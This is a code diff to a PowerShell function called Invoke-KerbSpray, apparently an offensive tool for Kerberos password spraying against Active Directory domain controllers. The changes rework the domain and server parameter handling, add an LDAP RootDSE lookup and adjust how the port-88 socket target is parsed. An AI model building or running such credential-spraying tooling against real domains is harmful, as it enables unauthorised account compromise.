@@ -70,7 +70,7 @@ function Invoke-KerbSpray {
         [String]
         $DumpFile,
 
-        [Parameter(Mandatory = $True)]
+        [Parameter(Mandatory = $False)]
         [ValidateNotNullOrEmpty()]
         [String]
         $Domain,
@@ -81,8 +81,16 @@ function Invoke-KerbSpray {
         $Server
     )
 
-    if (-not $Server) {
+    if ($Domain -and -not $Server) {
         $Server = [Net.Dns]::GetHostAddresses($Domain) | Where-Object {$_.AddressFamily -eq 'InterNetwork'} | Select-Object -First 1 -ExpandProperty IPAddressToString
+    }
+    elseif ($Server -and -not $Domain) {
+        $SearchString = "LDAP://" + $Server + "/RootDSE"
+        $DomainObject = New-Object System.DirectoryServices.DirectoryEntry($SearchString, $null, $null)
+        $Domain = $DomainObject.rootDomainNamingContext[0] -replace 'DC=' -replace ',','.'
+    }
+    elseif (-not $Domain -and -not $Server) {
+        Write-Error "Domain or Server parameter must be specified"
     }
 
     if($Hash -like "*:*") {
@@ -117,7 +125,7 @@ function Invoke-KerbSpray {
         }
     }
     else {
-        Write-Error "UserName or UserFile parameter must be specified"
+        Write-Error "UserName, UserFile or DumpFile parameter must be specified"
     }
 
     ForEach ($credential in $credentials) {
@@ -165,8 +173,7 @@ function Local:Invoke-KerbPreauth {
         $Server
     )
 
-    $TargetDCIP = [System.Net.Dns]::GetHostAddresses($Server) | Where-Object {$_.AddressFamily -eq 'InterNetwork'} | Select-Object -ExpandProperty IPAddressToString
-    $Address = [System.Net.IPAddress]::Parse($TargetDCIP)
+    $Address = [System.Net.IPAddress]::Parse($Server)
     $EndPoint = New-Object System.Net.IPEndPoint $Address, 88
     $Socket = New-Object System.Net.Sockets.Socket ([System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Stream, [System.Net.Sockets.ProtocolType]::TCP)
     $Socket.TTL = 128
